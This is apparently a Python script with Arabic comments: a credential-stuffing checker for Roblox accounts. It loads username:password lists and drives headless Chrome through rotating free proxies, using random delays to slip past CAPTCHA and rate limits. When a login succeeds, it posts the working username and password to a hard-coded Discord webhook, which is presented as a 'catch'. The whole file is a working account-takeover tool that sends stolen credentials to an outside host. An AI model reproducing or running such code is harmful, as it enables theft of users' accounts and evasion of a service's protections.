import time
import sys
import os
import requests
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# --- إعدادات المستخدم ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1395564556524191824/6gjDVUiguSSGzkiODa7QUdf-BsmE-hBG_03zrPWNgsfrA0EMbQtNtKh7cf6qfcqhHjKk"
ACCOUNTS_FILE = "accounts.txt"
# -----------------------

def print_now(text):
    print(text)
    sys.stdout.flush()

def get_free_proxies():
    """جلب قائمة بروكسيات مجانية من مصدر خارجي"""
    try:
        print_now("🌐 جاري جلب قائمة بروكسيات جديدة...")
        response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
        if response.status_code == 200:
            proxies = response.text.splitlines()
            print_now(f"✅ تم جلب {len(proxies)} بروكسي.")
            return proxies
    except Exception as e:
        print_now(f"❗ فشل جلب البروكسيات: {e}")
    return []

def check_login_with_proxy(username, password, proxy):
    """محاولة الدخول باستخدام بروكسي محدد"""
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument(f'--proxy-server={proxy}')
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    
    driver = None
    try:
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.set_page_load_timeout(30) # وقت محدد لتحميل الصفحة عبر البروكسي
        
        driver.get("https://www.roblox.com/login")
        time.sleep(random.uniform(4, 7))

        if "captcha" in driver.page_source.lower():
            return "CAPTCHA"

        WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.NAME, "username")))
        
        driver.find_element(By.NAME, "username").send_keys(username)
        time.sleep(random.uniform(0.5, 1))
        driver.find_element(By.NAME, "password").send_keys(password)
        time.sleep(random.uniform(0.5, 1))
        driver.find_element(By.ID, "login-button").click()

        time.sleep(12)

        if "home.roblox.com" in driver.current_url or "users.roblox.com" in driver.current_url:
            return "SUCCESS"
        elif "captcha" in driver.page_source.lower():
            return "CAPTCHA"
        else:
            return "FAILED"
            
    except Exception as e:
        return f"PROXY_ERROR: {e}"
    finally:
        if driver: driver.quit()

def main():
    print_now("🔥 بدء فاحص القائمة بنظام البروكسي التلقائي...")
    
    if not os.path.exists(ACCOUNTS_FILE):
        print_now(f"❌ خطأ: ملف {ACCOUNTS_FILE} غير موجود!")
        return

    with open(ACCOUNTS_FILE, "r") as f:
        accounts = [line.strip() for line in f.readlines() if ":" in line]

    print_now(f"📋 تم تحميل {len(accounts)} حساب للفحص.")
    
    proxy_list = get_free_proxies()
    
    for account in accounts:
        username, password = account.split(":", 1)
        success = False
        attempts = 0
        
        while not success and attempts < 5: # محاولة 5 بروكسيات لكل حساب
            if not proxy_list:
                proxy_list = get_free_proxies()
            
            current_proxy = random.choice(proxy_list)
            print_now(f"🔍 فحص {username} باستخدام بروكسي: {current_proxy} (محاولة {attempts+1})")
            
            status = check_login_with_proxy(username, password, current_proxy)
            
            if status == "SUCCESS":
                print_now(f"✅✅ شغال!! تم الإرسال لديسكورد: {username}")
                requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🔥 **صيد شغال (عبر بروكسي)!**\n`{username}:{password}`"})
                success = True
            elif status == "CAPTCHA":
                print_now(f"⚠️ كابتشا بالبروكسي الحالي.. سأجرب بروكسي آخر.")
                proxy_list.remove(current_proxy)
                attempts += 1
            elif "PROXY_ERROR" in status:
                print_now(f"❌ البروكسي بطيء أو معطل.. سأجرب غيره.")
                proxy_list.remove(current_proxy)
                attempts += 1
            else:
                print_now(f"❌ كلمة المرور غير صحيحة للحساب: {username}")
                success = True # لا داعي لتجربة بروكسي آخر إذا كانت الباسورد خطأ
            
            time.sleep(random.randint(5, 10))

    print_now("🏁 انتهى فحص القائمة.")

if __name__ == "__main__":
    main()
